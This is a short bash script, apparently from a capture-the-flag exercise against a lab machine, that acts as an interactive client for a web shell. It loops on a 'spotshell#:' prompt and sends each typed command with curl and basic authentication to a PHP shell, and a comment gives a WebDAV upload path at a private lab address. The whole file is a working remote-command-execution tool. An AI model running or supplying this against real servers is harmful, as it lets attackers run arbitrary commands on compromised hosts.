#!/bin/bash
while true; do
read -p "spotshell#: " cmd
curl --basic --user 'user:pass' --data-urlencode "cmd=$cmd" $1 -G
#http://10.10.10.67/webdav_test_inception/s.php
done;
